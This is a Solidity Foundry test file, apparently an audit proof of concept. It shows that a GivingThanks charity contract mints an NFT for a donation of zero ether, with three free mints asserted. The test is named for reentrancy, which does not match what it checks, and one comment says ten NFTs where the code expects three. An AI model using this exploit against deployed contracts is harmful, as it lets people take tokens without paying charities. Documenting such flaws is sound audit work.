// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/GivingThanks.sol";
import "../src/CharityRegistry.sol";
import "@openzeppelin/contracts/utils/Strings.sol";
import "@openzeppelin/contracts/utils/Base64.sol";
import { IERC721Receiver } from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract MintForFreeTest is Test {
    GivingThanks public charityContract;
    CharityRegistry public registryContract;
    address public admin;
    address public charity;
    address public donor;

    function setUp() public {
        // Initialize addresses
        admin = makeAddr("admin");
        charity = makeAddr("charity");
        donor = makeAddr("donor");

        // Deploy the CharityRegistry contract as admin
        vm.prank(admin);
        registryContract = new CharityRegistry();

        // Deploy the GivingThanks contract with the registry address
        vm.prank(admin);
        charityContract = new GivingThanks(address(registryContract));

        // Register and verify the charity
        vm.prank(admin);
        registryContract.registerCharity(charity);

        vm.prank(admin);
        registryContract.verifyCharity(charity);
    }


    function testReentrancyInDonate() public {
        // Deploy the mintForFree contract
        MintForFree mintContract = new MintForFree();

        // Start the prank as the mintForFree contract
        vm.startPrank(address(mintContract));

        // **Attempt to donate 0 to the charity**
        // Lets run it 3 times to see if we get 10 NFTs
        for (uint256 i = 0; i < 3; i++) {
            charityContract.donate{value: 0}(address(charity));
        }

        // Stop the prank
        vm.stopPrank();

        // **Check if multiple tokens were minted**
        uint256 attackerTokenBalance = charityContract.balanceOf(address(mintContract));
        // 3 should have been minted for free
        assertTrue(attackerTokenBalance == 3, "Attacker did not mint 3 tokens as expected");
        //Balance of charity should be 0
        assertEq(charity.balance, 0);
        


    }
}


/**
 * @title MintForFree
 * @dev Implements the IERC721Receiver interface to handle safe transfers of ERC721 tokens.
 */
contract MintForFree is IERC721Receiver{
    
    /**
     * @notice Handles the receipt of an ERC721 token.
     * @dev Called by the ERC721 token contract after a `safeTransferFrom`. Returns the function selector to confirm the token transfer.
     * @param operator The address which called `safeTransferFrom`.
     * @param from The address which previously owned the token.
     * @param tokenId The ID of the token being transferred.
     * @param data Additional data with no specified format.
     * @return bytes4 The function selector for `onERC721Received`.
     */
    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data) external override returns (bytes4) {
        return this.onERC721Received.selector;
    }
}